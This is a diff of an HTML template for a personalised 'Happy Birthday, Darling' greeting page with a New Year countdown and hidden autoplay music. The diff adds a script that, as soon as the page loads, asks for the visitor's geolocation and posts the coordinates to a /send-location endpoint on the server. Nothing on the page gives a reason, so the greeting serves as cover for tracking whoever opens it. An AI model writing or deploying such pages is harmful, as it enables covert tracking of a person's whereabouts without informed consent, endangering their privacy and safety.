@@ -1,65 +1,119 @@
 <!DOCTYPE html>
-
 <html>
-                <head>
-                    <title>Greeting</title>
-                    <meta charset="UTF-8">
-                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                    <style>
-                        body {
-                            font-family: Arial, sans-serif;
-                            display: flex;
-                            justify-content: center;
-                            align-items: center;
-                            height: 100vh;
-                            background-color: rgb(22, 181, 187);
-                            color: {{color}};
-                            text-align: center;
-                            background-image: url('https://i.ibb.co/tPHhp9B/beby.jpg');
-                            background-size: 150%;
-                            background-position: center;
-                            background-repeat: no-repeat;
-                        }
-                        h1 {
-                            justify-content: center;
-                            display: flex;
-                            font-family: gabriola;
-                            color: {{color}};
-                            font-size: 30px;
-                        }
-                        p {
-                            font-size: 25px;
-                        }
-                        
-                        .container {
-                            font-family: Gabriola;
-                            text-align: center;
-                            padding: 20px;
-                            border-radius: 15px;                    
-                        }
-                    </style>
-                </head>
-                <body>
-                    <div class="container">
-                        <h1>Happy Birthday, {{name}} 🎉</h1>
-                        <p> 
-                            On this special day, I want you to know how deeply you are loved. 
-                            You light up my world with your smile and fill my heart with happiness.
-                            As you celebrate your {{age}}th birthday, I hope this year brings you as much joy as you have given me.
-                            May all your dreams come true, and may you continue to shine brightly in everything you do.
-                        </p>    
-                        <p>   Happy Birthday, Darling! I love you 💖</p>
-                        
-                        <h2 style="display: none;">Busy signal Happy birthday</h2>
-                        <audio controls autoplay style="display: none;">
-                            <source src="{{ url_for('static', filename='images/happybirthday.mp3') }}">
-                            Your browser does not support the audio element.
-                        </audio>
+    <head>
+        <title>Greeting</title>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <style>
+            body {
+                font-family: Arial, sans-serif;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+                background-color: rgb(22, 181, 187);
+                color: {{color}};
+                text-align: center;
+                background-image: url('https://i.ibb.co/tPHhp9B/beby.jpg');
+                background-size: 150%;
+                background-position: center;
+                background-repeat: no-repeat;
+            }
+            h1 {
+                justify-content: center;
+                display: flex;
+                font-family: gabriola;
+                color: {{color}};
+                font-size: 30px;
+            }
+            p {
+                font-size: 25px;
+            }
+            .container {
+                font-family: Gabriola;
+                text-align: center;
+                padding: 20px;
+                border-radius: 15px;                    
+            }
+        </style>
+        <script>
+            function getLocation() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(sendLocation, showError);
+                } else {
+                    alert("Geolocation is not supported by this browser.");
+                }
+            }
 
-                        <h3>Time Remaining Until New Year:</h3>
-                            <p>{{ time_remaining.days }} days, {{ time_remaining.seconds // 3600 }} hours, and {{ (time_remaining.seconds // 60) % 60 }} minutes remaining until New Year!</p>
-                                                
-                        <!--<img src="https://i.ibb.co/fFdvvCj/beby.jpg" alt="beby" border="0">-->
-                    </div>
-                </body>
-            </html>
+            function sendLocation(position) {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+
+                // Send the location to the server
+                fetch('/send-location', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ latitude: latitude, longitude: longitude })
+                })
+                .then(response => {
+                    if (response.ok) {
+                        alert("Location sent successfully!");
+                    } else {
+                        alert("Error sending location.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                });
+            }
+
+            function showError(error) {
+                switch(error.code) {
+                    case error.PERMISSION_DENIED:
+                        alert("User  denied the request for Geolocation.");
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        alert("Location information is unavailable.");
+                        break;
+                    case error.TIMEOUT:
+                        alert("The request to get user location timed out.");
+                        break;
+                    case error.UNKNOWN_ERROR:
+                        alert("An unknown error occurred.");
+                        break;
+                }
+            }
+
+            // Automatically request location when the page loads
+            window.onload = function() {
+                getLocation();
+            };
+        </script>
+    </head>
+    <body>
+        <div class="container">
+            <h1>Happy Birthday, {{name}} 🎉</h1>
+            <p> 
+                On this special day, I want you to know how deeply you are loved. 
+                You light up my world with your smile and fill my heart with happiness.
+                As you celebrate your {{age}}th birthday, I hope this year brings you as much joy as you have given me.
+                May all your dreams come true, and may you continue to shine brightly in everything you do.
+            </p>    
+            <p>Happy Birthday, Darling! I love you 💖</p>
+            
+            <h2 style="display: none;">Busy signal Happy birthday</h2>
+            <audio controls autoplay style="display: none;">
+                <source src="{{ url_for('static', filename='images/happybirthday.mp3') }}">
+                Your browser does not support the audio element.
+            </audio>
+
+            <h3>Time Remaining Until New Year:</h3>
+            <p>{{ time_remaining.days }} days, {{ time_remaining.seconds // 3600 }} hours, and {{ (time_remaining.seconds // 60) % 60 }} minutes remaining until New Year!</p>
+
+            <!-- Hidden button for location (not needed anymore) -->
+            <button style="display: none;" onclick="getLocation()">Get Location</button>
+        </div>
+    </body>
+</html>
